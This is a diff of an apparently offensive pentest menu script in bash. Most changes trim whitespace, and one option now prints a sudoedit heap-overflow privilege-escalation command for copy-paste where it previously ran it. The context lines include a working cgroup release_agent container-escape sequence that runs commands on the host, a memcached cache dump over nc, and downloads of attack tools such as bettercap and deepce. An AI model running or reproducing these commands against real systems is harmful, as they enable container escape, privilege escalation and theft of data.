@@ -691,23 +691,23 @@ while true; do
 	;;
 	"169")
 		echo 'stats items' | nc localhost 11211 | grep -oe ':[0-9]*:' | grep -oe '[0-9]*' | sort | uniq | xargs -L1 -I{} bash -c 'echo "stats cachedump {} 1000" | nc localhost 11211'
-	;; 
+	;;
 	"170")
 		Scarica "bettercap/bettercap" "$ENTSSL""bettercap/bettercap/releases/download/v2.28/bettercap_linux_amd64_v2.28.zip" "bettercap_amd64_v2.28.zip"
-	;; 
+	;;
 	"171")
 		mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/xecho 1 > /tmp/cgrp/x/notify_on_release
 		host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 		echo "$host_path/cmd" > /tmp/cgrp/release_agentecho '#!/bin/sh' > /cmd
 		echo "ps aux > $host_path/output" >> /cmd
 		chmod a+x /cmdsh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
-	;; 
+	;;
 	"172")
 		Scarica "Keramas/Blowhole" "$ENTRAW""Keramas/Blowhole/master/blowhole.py" "blowhole.py"
-	;; 
+	;;
 	"173")
 		Scarica "stealthcopter/deepce" "$ENTRAW""stealthcopter/deepce/master/deepce.sh" "deepce.sh"
-	;; 
+	;;
 	"174")
 		echo "Digit a tar.gz file full path to extract"
 		ls *.tar.gz
@@ -716,13 +716,13 @@ while true; do
 		then
 			tar zxvf "$FLTR"
 		fi
-	;; 
+	;;
 	"175")
 		Scarica "nccgroup/go-pillage-registries_1.0_Linux_i386" "$ENTSSL""nccgroup/go-pillage-registries/releases/download/v1.0/go-pillage-registries_1.0_Linux_i386.tar.gz" "go-pillage-registries_1.0_Linux_i386.tar.gz"
 	;;
 	"176")
 		Scarica "nccgroup/go-pillage-registries_1.0_Linux_x86_64" "$ENTSSL""nccgroup/go-pillage-registries/releases/download/v1.0/go-pillage-registries_1.0_Linux_x86_64.tar.gz" "go-pillage-registries_1.0_Linux_x86_64.tar.gz"
-	;; 
+	;;
 	"177")
 		echo "Digit a command with arguments"
 		read -p "(example, ls -la): " CMD
@@ -772,7 +772,8 @@ while true; do
 		read -p "(example, perl -e 'print \"A\" x 65536'): " CMD
 		if [[ "$CMD" != "" ]];
 		then
-			sudoedit -s '\' `$CMD`
+			echo "Copy and paste this command to escalate privs"
+			echo "sudoedit -s '\' `""$CMD""`"
 		fi
 	;;
 	"183")
